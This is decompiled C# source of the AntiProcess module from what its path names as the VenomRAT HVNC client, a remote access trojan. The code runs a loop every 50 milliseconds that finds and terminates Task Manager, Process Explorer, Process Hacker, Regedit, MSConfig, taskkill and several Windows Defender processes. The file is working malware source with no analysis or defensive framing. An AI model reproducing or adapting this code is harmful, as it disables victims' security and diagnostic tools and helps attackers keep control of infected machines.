﻿// Decompiled with JetBrains decompiler
// Type: Client.Helper.AntiProcess
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading;


namespace Client.Helper
{
  public static class AntiProcess
  {
    private static Thread BlockThread = new Thread(new ThreadStart(AntiProcess.Block));

    public static bool Enabled { get; set; }

    public static void StartBlock()
    {
      AntiProcess.Enabled = true;
      AntiProcess.BlockThread.Start();
    }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void StopBlock()
    {
      AntiProcess.Enabled = false;
      try
      {
        AntiProcess.BlockThread.Abort();
        AntiProcess.BlockThread = new Thread(new ThreadStart(AntiProcess.Block));
      }
      catch
      {
      }
    }

    private static void Block()
    {
      while (AntiProcess.Enabled)
      {
        IntPtr toolhelp32Snapshot = AntiProcess.CreateToolhelp32Snapshot(2U, 0U);
        PROCESSENTRY32 lppe = new PROCESSENTRY32();
        lppe.dwSize = (uint) Marshal.SizeOf(typeof (PROCESSENTRY32));
        if (AntiProcess.Process32First(toolhelp32Snapshot, ref lppe))
        {
          do
          {
            uint th32ProcessId = lppe.th32ProcessID;
            string szExeFile = lppe.szExeFile;
            if (AntiProcess.Matches(szExeFile, "Taskmgr.exe") || AntiProcess.Matches(szExeFile, "ProcessHacker.exe") || AntiProcess.Matches(szExeFile, "procexp.exe") || AntiProcess.Matches(szExeFile, "MSASCui.exe") || AntiProcess.Matches(szExeFile, "MsMpEng.exe") || AntiProcess.Matches(szExeFile, "MpUXSrv.exe") || AntiProcess.Matches(szExeFile, "MpCmdRun.exe") || AntiProcess.Matches(szExeFile, "NisSrv.exe") || AntiProcess.Matches(szExeFile, "ConfigSecurityPolicy.exe") || AntiProcess.Matches(szExeFile, "MSConfig.exe") || AntiProcess.Matches(szExeFile, "Regedit.exe") || AntiProcess.Matches(szExeFile, "UserAccountControlSettings.exe") || AntiProcess.Matches(szExeFile, "taskkill.exe"))
              AntiProcess.KillProcess(th32ProcessId);
          }
          while (AntiProcess.Process32Next(toolhelp32Snapshot, ref lppe));
        }
        AntiProcess.CloseHandle(toolhelp32Snapshot);
        Thread.Sleep(50);
      }
    }

    private static bool Matches(string source, string target)
    {
      return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
    }

    private static void KillProcess(uint processId)
    {
      IntPtr num = AntiProcess.OpenProcess(1U, false, processId);
      AntiProcess.TerminateProcess(num, 0);
      AntiProcess.CloseHandle(num);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll")]
    private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(
      uint dwDesiredAccess,
      bool bInheritHandle,
      uint dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);
  }
}